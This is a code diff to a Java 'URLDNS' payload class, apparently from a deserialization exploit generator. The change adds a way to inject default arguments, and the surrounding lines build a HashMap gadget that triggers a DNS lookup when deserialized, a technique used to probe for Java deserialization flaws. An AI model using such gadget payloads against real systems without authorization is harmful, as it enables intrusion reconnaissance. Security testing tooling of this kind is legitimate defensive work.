@@ -12,6 +12,7 @@ import java.util.HashMap;
 
 public class URLDNS implements Payload {
 
+  private String[] args;
 
   /**
    *
@@ -24,6 +25,8 @@ public class URLDNS implements Payload {
    */
   @Override
   public Object getPayload(String[] args) throws Exception {
+    if (this.args != null)
+      args = this.args;
     //Avoid DNS resolution during payload creation
     //Since the field <code>java.net.URL.handler</code> is transient, it will not be part of the serialized payload.
     URLStreamHandler handler = new SilentURLStreamHandler();
@@ -37,6 +40,11 @@ public class URLDNS implements Payload {
         -1); // During the put above, the URL's hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.
 
     return ht;
+  }
+
+  @Override
+  public void injectDefaultArgs(String[] args) {
+    this.args = args;
   }
 
   class SilentURLStreamHandler extends URLStreamHandler {
